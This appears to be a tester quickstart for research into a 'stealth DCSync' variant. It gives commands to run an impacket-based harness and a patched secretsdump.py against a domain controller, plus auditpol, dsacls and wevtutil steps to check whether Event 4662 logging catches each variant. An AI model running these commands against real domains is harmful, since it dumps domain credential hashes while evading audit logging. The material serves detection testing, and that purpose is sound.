# Tester Quickstart

## Option A — Standalone harness (recommended)

The standalone harness calls DRSGetNCChanges directly via impacket's DRSUAPI bindings.
No patch or secretsdump.py modification required.

```bash
pip install "impacket>=0.12.0,<0.14.0"

python3 tester/stealth_dcsync_test.py \
    --dc 192.168.1.10 \
    --domain CORP \
    -u Administrator \
    -p 'Password123'
```

The script runs 5 variants (V1-V5), prints timestamps, and outputs a `wevtutil`
command to paste on the DC to retrieve Event 4662 entries.

To verify results, run the printed `wevtutil` command on the DC and look for
GUID `1131f6ad` (Get-Changes-All) in the Properties field. If it appears in
every variant (V1-V5), the bypass does **not** work on your DC version.

## Option B — Patch secretsdump.py

If you want to test with the actual `secretsdump.py` tool (not just the raw
DRS RPC), use the shell script:

```bash
pip install "impacket==0.13.1"

chmod +x tester/run_variants.sh

./tester/run_variants.sh \
    /path/to/secretsdump.py \
    'WINDOMAIN/Administrator:vagrant@192.168.50.227' \
    vagrant
```

The script patches lines 646 (ulFlags) and 649 (ulExtendedOp) in
`impacket/examples/secretsdump.py`, restores on completion (or next run
if interrupted).

## Collecting Event 4662

On the DC, check that audit policy captures the right events:

```
# Verify Directory Service Access auditing is enabled
auditpol /get /category:"DS Access"

# Verify SACL on domain root (required for Event 4662)
dsacls "dc=yourdomain,dc=local"
```

After running the harness, query events:

```
wevtutil qe Security /q:"*[System[EventID=4662]
[TimeCreated[@SystemTime>'2026-01-01T00:00:00.000Z']]]"
/c:20 /rd:true /f:text
```
